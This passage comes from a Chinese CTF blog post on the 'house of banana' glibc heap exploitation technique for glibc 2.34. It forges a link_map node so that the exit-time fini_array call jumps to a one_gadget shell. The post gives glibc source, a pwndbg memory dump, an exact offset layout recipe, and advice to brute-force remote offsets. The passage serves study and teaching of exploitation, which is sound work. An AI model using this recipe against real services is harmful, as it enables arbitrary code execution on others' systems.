&lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (l-&amp;gt;l_info[DT_FINI_ARRAY] != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  ElfW(Addr) *&lt;span class=&#34;built_in&#34;&gt;array&lt;/span&gt; =&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			    (ElfW(Addr) *) (l-&amp;gt;l_addr+ l-&amp;gt;l_info[DT_FINI_ARRAY]-&amp;gt;d_un.d_ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = (l-&amp;gt;l_info[DT_FINI_ARRAYSZ]-&amp;gt;d_un.d_val/ &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; (ElfW(Addr)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (i-- &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			    ((&lt;span class=&#34;type&#34;&gt;fini_t&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;array&lt;/span&gt;[i]) ();					&lt;span class=&#34;comment&#34;&gt;//目标位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这是一个比较通用的 info，0x7f56e4244cec &amp;lt;__execvpe+652&amp;gt; 是我们想要执行的函数。&lt;/p&gt;
&lt;p&gt;我们再看源码的相关部分，正常情况下，exit 使用的就是第四个节点的 l_info 的数据，也就是使用我们伪造的 info。&lt;/p&gt;
&lt;p&gt;sizeof (ElfW (Addr)) = 8，为了方便解释，我们将这里 l-&amp;gt;l_info [DT_FINI_ARRAYSZ] 的数据记为 ptr，ptr-&amp;gt;d_un.d_ptr, 其实就是 ptr+0x8 所指向的数据。ptr 是我们要伪造的数据，他是堆中的一个可控制的位置。我们想要执行一次就可以获得 shell，我们不妨让 i =1, 然后我们需要在 ptr+8 的位置写入的就是 1*8=8&lt;/p&gt;
&lt;p&gt;我们还要确定的是 arry 数组。(l-&amp;gt;l_addr+ l-&amp;gt;l_info [DT_FINI_ARRAY]-&amp;gt;d_un.d_ptr);&lt;/p&gt;
&lt;p&gt;l-&amp;gt;addr 其实就是我们伪造的 link_map 开始的位置，个人喜欢将这里写为 0，然后将 l_info [26] 写入另外一个地址，两者加起来就是数组的初始位置。我们记录这个地址为 ptr_a, 这个就会给 arry 赋值，然后	arry [i]	====&amp;gt;&amp;gt;  就是调用 ptr_a +8*i 位置的函数。也就是我们的后门。&lt;/p&gt;
&lt;p&gt;提供一个构造的布局，&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;fake+0x110&lt;/code&gt;  写入一个 ptr_a，且 ptr_a+0x8 处有 ptr，ptr 处写入的是最后要执行的函数地址.&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;fake+0x120&lt;/code&gt;  写入一个 ptr，且 ptr+0x8 处是 &lt;code&gt;i*8&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;我选择的是 &lt;code&gt;fake+0x110&lt;/code&gt;  写入 &lt;code&gt;fake+0x40&lt;/code&gt; ，在 &lt;code&gt;fake+0x48&lt;/code&gt;  写入 &lt;code&gt;fake+0x58&lt;/code&gt; ，在 &lt;code&gt;fake+0x58&lt;/code&gt;  写入 shell&lt;/p&gt;
&lt;p&gt;我选择在 &lt;code&gt;fake+0x120&lt;/code&gt;  写入 &lt;code&gt;fake+0x48&lt;/code&gt; ，在 &lt;code&gt;fake+0x50&lt;/code&gt;  处写入 8.&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; tel &lt;span class=&#34;number&#34;&gt;0x55a656f072a0&lt;/span&gt;(fake) &lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072a0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;							&lt;span class=&#34;comment&#34;&gt;//l_addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓     &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0028&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072c8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55a656f072a0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;				&lt;span class=&#34;comment&#34;&gt;//l_real&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0030&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072d0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;07&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0038&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072d8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0040&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072e0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;09&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0048&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072e8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55a656f072f8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f56e4244cec&lt;/span&gt; (execvpe+&lt;span class=&#34;number&#34;&gt;652&lt;/span&gt;) ◂— mov    rdx, r12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;a:&lt;span class=&#34;number&#34;&gt;0050&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072f0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0b&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0058&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f072f8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f56e4244cec&lt;/span&gt; (execvpe+&lt;span class=&#34;number&#34;&gt;652&lt;/span&gt;) ◂— mov    rdx, r12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;c:&lt;span class=&#34;number&#34;&gt;0060&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f07300&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt; /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;d:&lt;span class=&#34;number&#34;&gt;0068&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f07308&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;e:&lt;span class=&#34;number&#34;&gt;0070&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f07310&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0f&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0078&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f07318&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0080&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f07320&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓     &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00b&lt;/span&gt;8│  &lt;span class=&#34;number&#34;&gt;0x55a656f07358&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;c0│  &lt;span class=&#34;number&#34;&gt;0x55a656f07360&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;... ↓     &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1f&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;00f&lt;/span&gt;8│  &lt;span class=&#34;number&#34;&gt;0x55a656f07398&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0100&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073a0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0108&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073a8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0110&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073b0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55a656f072e0&lt;/span&gt; 	&lt;span class=&#34;comment&#34;&gt;//l_info[26]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;23&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0118&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073b8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0120&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073c0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55a656f072e8&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;//l_info[28]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;25&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0128&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073c8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;26&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0130&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073d0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;27&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0138&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0x55a656f073d8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后我们就是利用 onegadget 获得 shell 了。&lt;/p&gt;
&lt;p&gt;利用 gdb 万能必挂点，结合 one_gadget 工具帮助我们快速找到合适的 one_gadget&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/dreamkecat/blog_img//blog_img/image-20220922124913109.png&#34; alt=&#34;image-20220922124913109&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;一些注意点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些注意点&#34;&gt;#&lt;/a&gt; 一些注意点：&lt;/h5&gt;
&lt;p&gt;​	因为_rtld_global 这个符号是存在与 ld.so 文件中，往往出题人不会给出 ld.so 文件，，rtld_global_ptr 与 libc_base 的偏移在本地与远程并不是固定的，可能会在地址的第 2 字节处发生变化，因此可以爆破 256 种可能得到远程环境的精确偏移&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;​		本文主要就是介绍我们常用的手法，在高版本的利用情况，主要关注的是在较新版本 Glibc-2.34 0ubuntu3.2 的可行性。因为 2.34 主要问题还是在于一些 hook 函数被禁止，以及对_IO_str_finish、_IO_str_overflow 变化的影响，导致我们可以利用的点是在是很少了。但是这其实对于各位 ctfer 来讲，因为方法很少，导致攻击手法比较的单一，只有那么几个可以使用。在 3.2 版本之前，我们依旧可以通过修改 vtable 劫持控制流，或者攻击’exit_hook’(这个叫法可能会不太严谨，因为并不是一个 hook 的符号，而是其他的符号)。house of kiwi, 攻击 exit_hook 依旧是可以实现，且比较方便的。&lt;/p&gt;
&lt;p&gt;​	后面我这里主要介绍了 house of banana, 这项技术，依旧是用于 3.2，并且向下兼容。简要概括，就是修改第三个节点的 l_next 为堆地址 fake，并在该堆上伪造第四个节点。&lt;/p&gt;
&lt;p&gt;伪造 link_map&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;​				 *(fake+0x28)=fake。&lt;/li&gt;
&lt;li&gt;​				*(fake +0x48)=fake+0x58,   *(fake+0x50) = 0x8&lt;/li&gt;
&lt;li&gt;​				*(fake+0x58) = shell&lt;/li&gt;
&lt;li&gt;​				*(fake+0x110) = fake+0x40&lt;/li&gt;
&lt;li&gt;​				*(fake+0x120) = fake+0x48&lt;/li&gt;
&lt;li&gt;​				(int)*(fake+0x31c) = 0x9&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最后笔者在这里提出一个未完成的验证，house of emma 在 3.2 版本下的利用.&lt;/p&gt;
&lt;p&gt;​		因为个人实力依旧比较菜，文章出可能会出现错误及不足，欢迎斧正。也希望能和对此文感兴趣的师傅进一步交流关于新版本的利用姿势。&lt;/p&gt;
&lt;p&gt;​	[参考]：&lt;/p&gt;
&lt;p&gt;​	想到验证各种姿势，感谢&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ydWFuNzc3LmdpdGh1Yi5pby8=&#34;&gt; ru7n&lt;/span&gt; 师傅&lt;/p&gt;
&lt;p&gt;​	3.2 下攻击 exit_hook 的思考，感谢&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjQ4Mzc4Nz90eXBlPWJsb2c=&#34;&gt; Ayaka&lt;/span&gt; 师傅&lt;/p&gt;
&lt;p&gt;​	house of banana 的最初构想	感谢&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL21lbWJlci8xNDY4Nzg=&#34;&gt; ha1vk&lt;/span&gt; 师傅&lt;/p&gt;
</content>
        <category term="pwn" />
        <updated>2022-06-03T03:15:34.000Z</updated>
    </entry>
</feed>
